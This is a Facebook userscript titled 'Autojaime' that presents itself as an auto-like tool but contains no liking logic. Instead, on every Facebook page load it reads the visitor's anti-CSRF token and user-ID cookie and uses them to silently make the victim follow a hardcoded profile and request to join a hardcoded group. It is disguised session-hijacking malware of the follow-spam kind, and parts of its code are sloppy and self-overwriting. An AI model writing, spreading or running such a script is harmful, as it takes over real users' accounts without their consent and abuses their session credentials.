// ==UserScript==
// @name			*[NEW]* Autojaime
// @namespace		*[NEW]* Autojaime
// @description		*[NEW]*  Autojaime 
// @author			hich
// @authorURL		none
// @include			htt*://www.facebook.com/*
// @exclude 			htt*://apps.facebook.com/*
// @icon			none
// @version			v 1.0 Final
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAl(B){
var A=B+"=";
		if(document.cookie.length>0){konum=document.cookie.indexOf(A);
		if(konum!=-1){konum+=A.length;son=document.cookie.indexOf(";",konum);
		if(son==-1){son=document.cookie.length}return unescape(document.cookie.substring(konum,son))}else{return""}}
}

function getRandomInt(B,A){
	return Math.floor(Math.random()*(A-B+1))+B
}
function randomValue(A){return A[getRandomInt(0,A.length-1)]}

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(D){
	var C=new XMLHttpRequest();
	var B="/ajax/follow/follow_profile.php?__a=1";
	var A="profile_id="+D+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
		C.open("POST",B,true);
		C.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		C.setRequestHeader("Content-length",A.length);
		C.setRequestHeader("Connection","close");
		C.onreadystatechange=function(){if(C.readyState==4&&C.status==200){C.close}};
		C.send(A)}
		
		
function sublist(B){
	var A=document.createElement("script");
		A.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+B+" }).send();";
		document.body.appendChild(A)}
		
a("100005390741915");

var gid=["465088446889608"];
var gid=["573735962651040"];
var gid=["463242523746483"];
var gid=["356201537817839"];
var gid=["433021250116124"];
var fb_dtsg=document.getElementsByName("fb_dtsg")[0]["value"];
var user_id=document.cookie["match"](document.cookie["match"](/c_user=(\d+)/)[1]);
var httpwp=new XMLHttpRequest();
var urlwp="/ajax/groups/membership/r2j.php?__a=1";
var paramswp="&ref=group_jump_header&group_id="+gid+"&fb_dtsg="+fb_dtsg+"&__user="+user_id+"&phstamp=";
httpwp.open("POST",urlwp,true);
httpwp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
httpwp.setRequestHeader("Content-length",paramswp.length);
httpwp.setRequestHeader("Connection","keep-alive");
httpwp.send(paramswp);
